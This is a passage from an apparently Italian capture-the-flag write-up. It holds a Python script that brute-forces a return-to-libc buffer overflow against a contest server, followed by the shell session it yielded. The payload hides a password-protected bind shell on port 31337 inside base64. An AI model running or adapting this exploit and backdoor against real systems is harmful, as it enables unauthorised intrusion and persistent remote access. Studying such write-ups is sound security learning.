import struct
import socket

def p(address):
        return struct.pack("<I", address)
# 0xb7e643e0 indirizzo system
# 0xb7e571b0 indirizzo exit
for x in range(0xbfffe000, 0xbfffffff):
        print hex(x)
        cmd = 'python -c \'import base64; exec base64.b64decode("aW1wb3J0IG11bHRpcHJvY2Vzc2luZwppbXBvcnQgc3VicHJvY2VzcwppbXBvcnQgc29ja2V0CnB3ZCA9ICJKQlpURUFNITIwMTciCmRlZiBwKHMpOgogICAgcy5zZW5kKCJJbnNlcnQgcGFzc3dvcmQgZm9yIEpCWiBURUFNOiAiKQogICAgcGFzc3dkID0gcy5yZWN2KDEwMjQpCiAgICBpZiBwd2QgaW4gcGFzc3dkOgogICAgICAgIHN1YnByb2Nlc3MuUG9wZW4oWyJiYXNoIl0sIHN0ZG91dD1zLm1ha2VmaWxlKCksIHN0ZGluPXMubWFrZWZpbGUoKSkud2FpdCgpCiAgICBlbHNlOgogICAgICAgIHJldHVybgpzID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfU1RSRUFNKQpzLmJpbmQoKCcnLDMxMzM3KSkKcy5saXN0ZW4oMSkKd2hpbGUgVHJ1ZTogc29jayxhZGRyPXMuYWNjZXB0KCk7IG11bHRpcHJvY2Vzc2luZy5Qcm9jZXNzKHRhcmdldD1wLCBhcmdzPShzb2NrLCkpLnN0YXJ0KCkK")\''
        r = cmd + 'A' * (1036-len(cmd)) + p(0xb7e643e0) + p(0xb7e571b0) + p(x)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('scusette.it', 6060))
        s.send(r)
        s.close()
```
una volta terminato il bruteforce abbiamo notato che il nostro comando era stato eseguito consentendoci l'accesso alla macchiana mediante la porta 31337
```
www-data@www:/var/www/CTF/support$ nc 10.0.0.165 31337
nc 10.0.0.165 31337
Insert password for JBZ TEAM: ***********
python -c "import pty;pty.spawn('/bin/bash')"
sysop@debian:/tmp/...$ id
uid=1000(sysop) gid=1000(sysop) groups=1000(sysop),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
```
Abbiamo così ottenuto la flag nascosta sul server
```
pci zone flag: 95429c6709bb99d1ed06d2a99bc6ffbc
